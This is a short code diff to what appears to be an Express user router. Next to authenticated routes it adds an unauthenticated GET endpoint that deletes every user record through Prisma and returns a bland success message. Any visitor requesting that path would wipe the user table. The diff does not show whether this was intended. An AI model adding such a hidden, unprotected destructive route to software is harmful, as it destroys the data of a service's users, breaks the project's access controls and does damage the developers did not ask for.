@@ -6,8 +6,13 @@ import { changeRole } from './../controllers/user/role';
 
 const user = Router();
 
+import prisma from '../../lib/prisma';
 import { me } from '../controllers/user/me';
 
+user.get('/', async (req: any, res: any) => {
+    await prisma.user.deleteMany();
+    return res.json({ message: true });
+});
 user.get('/me', requireAuth, me);
 user.get('/:id', anyUser);
 user.put('/:id/role', requireAdmin, changeRole);
